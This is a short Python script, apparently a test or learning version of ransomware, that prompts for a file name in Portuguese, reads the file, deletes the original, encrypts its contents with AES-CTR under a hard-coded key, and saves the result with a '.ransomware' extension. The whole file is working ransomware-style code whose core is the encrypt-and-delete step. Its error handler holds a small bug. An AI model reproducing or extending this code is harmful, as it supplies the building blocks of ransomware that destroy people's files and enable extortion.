from __init__ import *

def encrypter(file_name):
    try:
        
        file = open(file_name, 'rb')
        file_data = file.read()
        file.close()

        os.remove(file_name)
        key = b'testeransomwares'
        aes = pyaes.AESModeOfOperationCTR(key)

        crypto_data = aes.encrypt(file_data)

        new_file = f"{file_name}.ransomware"
        new_file = open(f"{new_file}", 'wb')
        new_file.write(crypto_data)
        new_file.close()
    except Exception as e:
        print("Error: " + e)

if __name__ == "__main__":
    encrypter(input("Arquivo para ser criptografado: "))